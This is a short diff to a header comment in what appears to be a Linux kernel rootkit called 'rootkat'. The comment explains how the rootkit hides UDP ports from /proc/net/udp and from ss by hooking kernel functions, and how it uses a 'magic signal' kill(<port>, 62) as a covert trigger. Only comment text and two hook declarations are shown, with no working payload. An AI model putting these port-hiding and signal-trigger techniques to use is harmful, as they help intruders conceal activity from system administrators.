@@ -8,10 +8,10 @@
  * is in the shared hidden_ports registry. Same magic-signal trigger
  * as TCP: kill(<port>, 62).
  *
- * NOTE: ss -ulnp uses NETLINK_SOCK_DIAG with IPPROTO_UDP, which goes
- * through a different fill path (udp_diag_dump → inet_diag_msg_attrs_fill).
- * Hooking the netlink path for UDP is a v3 milestone; v2 covers the
- * /proc/net/udp{,6} surface only.
+ * The ss(8) NETLINK_SOCK_DIAG path for UDP is covered separately by
+ * hook_inet_sk_diag_fill — that fill function is protocol-agnostic so
+ * one hook handles TCP and UDP via netlink. This file only owns the
+ * /proc/net/udp{,6} seq_file surface.
  */
 int rootkat_hook_udp4_seq_show_install(void);
 void rootkat_hook_udp4_seq_show_remove(void);
